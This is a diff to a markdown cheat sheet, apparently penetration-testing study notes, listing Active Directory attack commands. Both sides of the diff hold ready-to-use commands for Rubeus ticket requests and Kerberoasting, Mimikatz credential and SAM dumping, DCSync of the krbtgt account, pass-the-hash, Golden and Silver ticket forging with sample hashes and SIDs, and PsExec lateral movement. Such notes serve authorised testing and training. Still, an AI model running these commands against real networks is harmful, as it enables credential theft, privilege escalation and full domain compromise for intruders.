@@ -85,7 +85,7 @@ You may already have a shell!
 
 ```Rubeus.exe asktgt /domain:$DOMAIN /user:$DOMAIN_USER /rc4:$NTLM_HASH /ptt```
 
-### roasting
+### Roasting
 
 ```Rubeus.exe kerberoast/asreproast```
 
@@ -94,13 +94,12 @@ You may already have a shell!
 # Mimikatz
 https://adsecurity.org/?page_id=1821
 
-'"privilege::debug" "token::elevate" "lsadump::sam"'
-
-#### Turning an NTLM into TGT:
+#### Turn an NTLM into a TGT:
 ```
+mimikatz#> 
 privilege::debug
 sekurlsa::logonpasswords
-mimikatz # sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:e2b475c11da2a0748290d87aa966c327 /run:PowerShell.exe
+sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:e2b475c11da2a0748290d87aa966c327 /run:PowerShell.exe
 ```
 
 ```
@@ -117,33 +116,50 @@ PSEXEC to DC -
 ```lsadump::dcsync /user:domain\krbtgt```
 
 
-- Golden:
+#### Golden:
 Jump to DC to dump krbtgt hash:
 
-psexec.exe \\dc01 cmd.exe
+```psexec.exe \\dc01 cmd.exe```
 
+```
 Privilege::debug
-
 lsadump::lsa /patch
+```
 
-
-Back on WKSTN - 
-
+Now can create a Golden Ticket:
+```
 Kerberos::purge
-
 kerberos::golden /user:fakeuser /domain:corp.com /sid:S-1-5-21-1602875587-
 2787523311-2599479668 /krbtgt:75b60230a2394a812000dbfad8415965 /ptt
+```
 
+```
 misc::cmd
-
 psexec.exe \\dc01 cmd.exe
+```
 
--Silver:
+#### Silver:
+
+Get domain SID  - ```Whoami /user```
+
+```
+kerberos::list
+mimikatz # kerberos::golden /user:offsec /domain:corp.com /sid:S-1-5-21-1602875587- 2787523311-2599479668 /target:CorpWebServer.corp.com /service:HTTP /rc4:E2B475C11DA2A0748290D87AA966C327 /ptt
+```
+
+#### MAINTENANCE
+```
+mimikatz # kerberos::purge
+Ticket(s) purge for current session is OK
+mimikatz # kerberos::list
+```
+
+#### Invoke Mimikatz
+
+Invoke Mimikatz -Command '"privilege::debug" "token::elevate" "lsadump::sam"'
 
 
-
-
-#### Lat Move
+# Lat Move
 ```PsExec.exe -accepteula \\$HOSTNAME cmd```
 
 ```psexec.py $DOMAIN/$USER@$HOSTNAME -k -no-pass```
